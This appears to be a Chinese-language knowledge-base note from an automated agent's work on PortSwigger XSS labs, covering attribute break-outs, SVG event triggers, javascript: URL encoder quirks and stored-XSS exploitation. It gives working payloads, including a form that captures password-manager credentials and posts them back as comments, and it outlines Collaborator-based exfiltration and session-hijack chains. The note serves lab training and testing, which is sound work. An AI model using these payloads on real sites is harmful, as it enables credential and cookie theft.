---
title: xss-context-family
---

# xss-context-family

PortSwigger XSS context 题的通用判定/利用模式:先探照射点与编码器,再选绕过。工具 `page_alert`(CDP 预挂 alert/confirm/prompt 勾子)、`raw_http`(字节级请求行,探编码器必需)、`browser_suite`、`html_text`。

## 可复用模式

1. **HTML 属性里的 JS 串 + 服务端只转义 `'`**:射点在双引号 HTML 属性内、JS 串是单引号时,提交 HTML 实体 `&apos;`/`&#39;` —— 服务端看不到 `'` 故不转义,浏览器解析属性时先 HTML 解码成 `'`,JS 才看到它 ⇒ 破串。前提:服务端**不**编码 `&`。实战(lab-onclick…backslash-escaped,stored 评论 website 字段):`http://x/?a=&apos;-alert(1)-&apos;` → `onclick="…track('http://x/?a='-alert(1)-'')"`。 2. **SVG 标签/事件漏网**:常见标签被挡或 400 时,`<svg>` 子集常放行。`<svg><animatetransform onbegin=alert(1)>` 载入即触发(lab-some-svg-markup-allowed 实证)。 3. **`javascript:` URL 射点**(按批45R 实测字母表改写;实例 lab-javascript-url-some-characters-blocked) - 输入落进 `href="javascript:fetch('/analytics',{method:'post',body:'<URI>'}).finally(...)"` 的**单引号 JS 串**内,且整份响应只有这一个反射点。 - 实例编码器管线 = **先百分号解码一次,再处理**:原样保留 alnum 与 `" { } | ^ $ , * / ~ _ - . !`(空格→`+`);百分号编码 `' ; : = @ < > & + ?`;**删除 `( ) [ ]`、反引号、反斜杠与所有 `%`**。 - 后果:双重编码换不来字面 `%28`(`%2528` → `28`);**真用户手势下 Chrome 会先百分号解码再执行 `javascript:` URL**(批48 实测:`href="javascript:alert%281337%29"` 真点击 → alert:1337;合成 `a.click()` 不执行 ⇒ 旧结论是假阴性,见 [[javascript-url-execution-needs-real-gesture]])⇒ `%27` 在点击时变 `'`,**JS 单引号串可破**;`"` 能破 HTML 属性但 `=` 被编码 ⇒ 只能注属性名、给不出事件处理器值;`&` 被编码 ⇒ 用不了实体;`(` `)` 在所有注入槽(值/参数名/路径)都不可达 ⇒ 破串后只能借模板里现成的圆括配对(见 [[records/lab-javascript-url-some-characters-blocked]] 未决面)。 4. **存储型偷密码(无 exploit server 时的同源回传)**:评论注入 `<input name=username id=username><input type=password name=password onchange="if(this.value.length)fetch('/post/comment',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'csrf='+document.getElementsByName('csrf')[0].value+'&postId=1&comment='+encodeURIComponent(username.value+' : '+this.value)+'&name=pw&email=pw@x.com'})">` —— victim 的密码管理器填充 → `change` → 用 victim 自己的 csrf 把凭据发成评论,自己再读回。前提:该 lab 无 exploit server 且平台防火墙挡外联。

## 存储型 XSS 的利用面

- **执行面**:评论若服务端渲染 into HTML,`<script>` 直接执行;若走 XHR+`innerHTML` 则不执行。先看 `?postId=` 响应里有没有未编码的 `<script>`。 - **解析顺序坑**:评论常排在留言表单之前,脚本在解析期执行时 `document.getElementsByName('csrf')[0]` 还不存在 → 静默失败;要 `window.addEventListener('load',…)`。 - **两类外传**:①同源回传(凭据/cookie POST 成评论,再读回;campaign 实录见 [[records/lab-capturing-passwords]]、[[records/lab-stealing-cookies]],practice/eval 实录见 eval lab-stealing-cookies);②就着 victim 会话干脏活(偷 csrf 改邮箱,[[records/lab-perform-csrf]]);③带外 OOB 回传(载荷把凭据/cookie 打到 Collaborator/oastify,本题 stealing-cookies 与 capturing-passwords 实证,kimi G1 补)。 - **victim 面**:博客评论类 lab 的 victim 会自动浏览评论;只改自己邮箱是偷不到 victim 的。

## 判读纪律

- **`page_alert --driver` 直接调 `el.onclick()`**:用 `el.click()` 触发带 `href` 的链接会跳转销毁文档,预挂的 `window.__labAlerts` 随之丢失 ⇒ `fired=false` 假阴性。用 `--driver "…onclick()"` 或先把 href 指向无害地址。 - **focus 类射点(ng-focus/onfocus/autofocus)先确认 `document.hasFocus()`**:未聚焦文档里 Chrome 只设 activeElement、不派发 focus 事件 ⇒ 系统性假阴性;先 `browser_suite call Page.bringToFront`。细节见 [[focus-触发载荷判读-先让文档处于聚焦态]]。 - 反射编码器探测:用 `raw_http --request-line 'GET /p?x=<chars> HTTP/1.1'`,再 `text_grep`/`read` 看原文;`raw_http --out` 写完整首响应体。

## 实录溯源

- [[records/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped]]、[[records/lab-some-svg-markup-allowed]]、[[records/lab-javascript-url-some-characters-blocked]]、[[records/lab-angularjs-expression]]、[[records/lab-very-strict-csp-with-dangling-markup-attack]]、[[records/lab-capturing-passwords]]、[[records/lab-perform-csrf]]、[[records/lab-stealing-cookies]]

## 相关族

- DOM 型源→汇见 [[dom-xss-family]];Angular/CSTI 表达式面见 [[client-side-template-injection-family]];CSP 表单面见 [[csrf-family]]。

## Links

- evidences: [[javascript-url-payload-when-parentheses-are-stripped]]

关联:[[oob-callback-family]](Collaborator 零回调判读先问 bot 活动面)、host-header 族注的消费者追踪法(日志早列消费者清单,本节从渲染面立论,互补)。

## 错径写入与日志渲染面(sn 谱系,2026-10-13 非过拟合蒸馏)

- **错误响应可以是写入信号**:把载荷置入某槽后恒定 500/4xx 不等于该槽封死——先问这个错误路径有没有副作用(请求日志、审计记录、失败登录表)。判死前的伪像审计行应加「错误路径副作用」一项。
- **日志渲染面是标准存储 XSS 位**:/admin/logs、audit、recent-activity 类端点若未转义渲染日志,任何被记录的输入(含会话 cookie 的结构半)即注入面;枚举隐藏端点时 logs/audit 类子路径优先。
- **受害者 bot 的活动面决定盲载荷命中**:bot 不逛首页评论区也可能逛管理日志页;Collaborator 零回调时先问「bot 到底逛哪」,UA 特征(Mozilla/5.0 (Victim))与 Referer 可从交互反推。
- 通用链:槽载荷→错误路径写入→日志页渲染→bot 执行→Collaborator 外带会话→重放提权。零题绑:四步各自由现有件覆盖(http_session、burp_collab、banner_verdict)。
